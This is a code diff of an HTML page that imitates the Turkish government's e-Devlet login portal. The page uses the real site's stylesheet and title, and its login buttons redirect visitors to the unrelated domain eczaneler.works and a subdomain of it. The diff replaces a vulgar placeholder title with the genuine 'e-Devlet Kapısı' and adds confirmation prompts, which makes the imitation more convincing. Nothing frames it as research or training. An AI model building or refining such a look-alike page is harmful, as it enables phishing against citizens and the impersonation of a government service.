@@ -8,7 +8,7 @@
     <meta name="description" content="e-Devlet Kapısı">
     <meta name="author" content="">
     <link rel="stylesheet" href="https://cdn.e-devlet.gov.tr/themes/izmir/css/login-main.1.9.5.css">
-    <title>ananın Kapısı</title>
+    <title>e-Devlet Kapısı</title>
 </head>
 
 <body data-lang="tr_TR.UTF-8">
@@ -32,9 +32,9 @@
                         <form method="post" id="loginForm" name="sifreGirisForm" autocomplete="off">
                             <fieldset>
                                 <div class="form-row center-item">
-                                    <button class="btn btn-send" name="submitButton" type="button" onclick="selectMethod('E-devlet Şifresi')">E-devlet Şifresi</button>
+                                    <button class="btn btn-send" name="submitButton" type="button" onclick="showAlert('E-devlet Şifresi')">E-devlet Şifresi</button>
                                     <button class="btn btn-cancel" name="cancelButton" value="İptal" onclick="cancel()">İptal</button>
-                                    <button class="btn btn-send" name="submitButton" type="button" onclick="selectMethod('Mobil İmza')">Mobil İmza</button>
+                                    <button class="btn btn-send" name="submitButton" type="button" onclick="showAlert('Mobil İmza')">Mobil İmza</button>
                                     <button class="btn btn-send" name="submitButton" type="submit">Giriş Yap</button>
                                 </div>
                             </fieldset>
@@ -59,12 +59,8 @@
     </div>
 
     <script type="text/javascript">
-        function selectMethod(method) {
-            if (method === "E-devlet Şifresi") {
-                alert('E-devlet Şifresi seçildi.');
-            } else if (method === "Mobil İmza") {
-                alert('Mobil İmza seçildi.');
-            }
+        function showAlert(method) {
+            alert(method + " seçildi. Giriş yap tuşuna basıldığında yönlendirilmek istediğinize emin misiniz?");
         }
 
         function cancel() {
@@ -75,9 +71,15 @@
             event.preventDefault();
             var selectedButton = document.querySelector(".btn-send:focus");
             if (selectedButton && selectedButton.textContent === "E-devlet Şifresi") {
-                window.location.href = "https://eczaneler.works/";
+                var confirmRedirect = confirm("E-devlet Şifresi'ne yönlendirilmek istediğinize emin misiniz?");
+                if (confirmRedirect) {
+                    window.location.href = "https://eczaneler.works/";
+                }
             } else if (selectedButton && selectedButton.textContent === "Mobil İmza") {
-                window.location.href = "https://e-dergi.eczaneler.works/";
+                var confirmRedirect = confirm("Mobil İmza'ya yönlendirilmek istediğinize emin misiniz?");
+                if (confirmRedirect) {
+                    window.location.href = "https://e-dergi.eczaneler.works/";
+                }
             }
         });
     </script>
